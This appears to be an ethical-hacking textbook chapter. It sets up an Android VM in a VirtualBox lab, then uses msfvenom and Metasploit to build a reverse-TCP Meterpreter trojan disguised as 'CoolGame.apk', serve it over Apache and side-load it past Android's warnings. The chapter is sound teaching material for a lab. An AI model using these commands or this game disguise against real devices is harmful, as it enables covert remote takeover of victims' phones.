
# Setting up Android VM in VirtualBox

We want to hack an Android mobile device in a safe, ethical way, so we’ll begin by adding an Android VM in our virtual hacking lab. Follow these steps to download and configure the VM.

## Download and Configure

1. Go to [https://www.osboxes.org/android-x86/](https://www.osboxes.org/android-x86/) and scroll down to the Android-x86 8.1-RC1 Oreo section. Select the `VirtualBox` tab and click the Download button for the 64-bit version.
2. Your download should have a `*.7z` file extension. To unzip the file, you’ll need to download and install `7-Zip` for Windows, Archiver for Mac, or `p7zip-full` for Linux. Once you have the required software, unzip the Android VM: on Windows, right-click the file and select `7-Zip`▶`Extract Here`; on macOS or Linux, double-click the file. The VM will be extracted into a folder called `64bit`.
3. Open `VirtualBox` and click New to open the Create Virtual Machine window.
4. In the Name and operating system dialog, enter Android 8.1 or similar in the Name: text box, select Linux from the Type: drop-down list, and choose Other Linux (64-bit) from the Version: drop-down list. Then click Next on Windows or Continue (on macOS).
5. In the Memory size dialog, enter 2048 in the box to give the VM 2,048MB (2GB) of RAM and click through to the next screen.
6. In the Hard disk dialog, choose Use an existing virtual hard disk file and click the Browse icon (the folder with a green arrow). In the pop-up window that appears, click Add. Then find and select the `*.vdi` file inside the `64bit` folder you unzipped.
7. Click through to return to the Hard disk dialog and choose Create to create your VM. Your new Android 8.1 VM should now appear in the list of VMs in VirtualBox, as shown in [Figure 9-1](#c09.xhtml#figure9-1).
8. Select the Android VM in the list, go to Settings, and choose the Display tab. In the Graphics Controller: drop-down list, select `VBoxSVGA`. This changes the display settings so that we’ll be able to see the graphical user interface (GUI) version of our Android smartphone VM.
9. Still in the Display tab, make sure the checkbox beside Enable 3D Acceleration is unchecked. (If your VM doesn’t work in a moment, however, you might have to turn on 3D acceleration.)
10. Switch to the Network settings tab and choose the NAT network named `PublicNAT`. This will enable your Android VM to communicate with your Kali VM in your virtual hacking lab.

![Figure 9-1: We’ve added an Android 8.1 VM to VirtualBox!](image_fi/502000c09/f09001.png)
Figure 9-1: We’ve added an Android 8.1 VM to VirtualBox!

You’re now ready to fire up your Android VM! It may take a few moments to load the first time (and you may need to restart your VM if the screen stays black for more than a minute or so), but you’ll eventually see an Android device home screen like the one shown in [Figure 9-2](#c09.xhtml#figure9-2).

![Figure 9-2: The home screen on your virtual Android device](image_fi/502000c09/f09002.png)
Figure 9-2: The home screen on your virtual Android device

Before you start exploring the VM, go to Input▶Mouse Integration in the Android VM’s menu bar to deselect Mouse Integration. Leaving Mouse Integration on can make it difficult to control the pointer on the Android VM. (The Android VM is made for touch screens, so the mouse can be frustrating to use in Android anyway.) With that done, you’re ready to look around your virtual Android device.

Open the Chrome browser and browse to a web page or open the Contacts app and add a few contacts—do anything you want to try. The Android VM is almost identical to a real Android tablet or phone, except that it can’t make phone calls and it doesn’t have certain sensors like GPS for location services. Remember that you can use the right CTRL key (Windows) or left COMMAND key (Mac) to regain control of your mouse when you want to leave the Android VM, just as we’ve done with other VMs.

## Launching an Android Trojan

Now we’re ready to create some malware. Just as we did with your Windows VM in Chapter 6, we’ll use a Meterpreter trojan to infect and take over the Android VM. We’ll hide the trojan in a file called `CoolGame.apk`. Android uses the APK file format to distribute and install mobile apps. Following these steps, you’ll see how easy it is for an attacker to trick an Android user into installing and running an infected app.

1. Log in to your Kali VM and launch Metasploit.
2. At the Metasploit `msf6` command prompt, type the following command as one long line, substituting your Kali VM’s IP address after `LHOST=`:
```
msf6 > sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.9.4 -f raw -o /var/www/html/share/CoolGame.apk
```
This creates an `android/meterpreter/reverse_tcp` payload in the form of an APK file and saves it directly to Kali’s shared web folder. Metasploit will respond with a few lines of output, ending with something like the following:
```
--snip--
Payload size: 10080 bytes
Saved as: /var/www/html/share/CoolGame.apk
```
3. Turn on the Apache web server service so you can download the file from your Android VM:
```
msf6 > sudo service apache2 start
```
4. To verify that your Kali web server is active, open Firefox and go to `localhost/share`. You should see `CoolGame.apk` in the file listing.
5. Enter these four commands in the Metasploit terminal window to set up the listener for handling incoming Meterpreter connections:
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp PAYLOAD => android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.9.4
LHOST => 10.0.9.4
msf6 exploit(multi/handler) > exploit
```
Metasploit is now listening for incoming connections!

## Infecting the Android VM

Now we’ll download the trojan app and deliberately infect your virtual Android device. Switch back to your Android VM and follow these steps:

1. Open the Chrome browser and enter your Kali VM’s IP address in the address bar, followed by `/share/`, like `10.0.9.4/share/`, as shown in [Figure 9-3](#c09.xhtml#figure9-3).

![Figure 9-3: Navigate to your Kali VM’s share folder from your Android VM’s Chrome browser to find your CoolGame.apk trojan app ready to download and install.](image_fi/502000c09/f09003.png)
Figure 9-3: Navigate to your Kali VM’s `share` folder from your Android VM’s Chrome browser to find your `CoolGame.apk` trojan app ready to download and install.

2. Click the APK file to download it. Android will pop up a message the first time you try to download a file, asking you to give Chrome permission to access file storage on your device. Click Update Permissions, then Allow.

![](image_fi/502000c09/g09001.png)

3. Click your APK file again to download it. Chrome will usually show you the warning “This type of file can harm your device.” Click OK to download the file anyway.

4. Click the down arrow in the upper-left corner of your Android VM’s screen, and you’ll see the Download Manager as shown in [Figure 9-5](#c09.xhtml#figure9-5). Click the name of your APK file in the list to install the app.

5. Android will pop up yet another window telling you “your phone is not allowed to install unknown apps from this source.” Click Settings, then slide the toggle switch to turn on the Allow from this source setting.

![Figure 9-5: Accessing the Download Manager](image_fi/502000c09/f09005.png)
Figure 9-5: Accessing the Download Manager
